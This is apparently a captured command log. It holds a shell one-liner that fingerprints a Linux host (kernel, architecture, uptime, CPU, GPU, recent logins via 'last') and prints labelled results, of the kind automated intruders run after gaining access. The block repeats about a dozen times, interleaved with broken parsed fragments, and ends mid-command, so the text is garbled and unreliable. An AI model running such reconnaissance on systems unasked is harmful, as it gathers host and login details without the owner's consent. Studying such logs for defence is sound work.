"ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		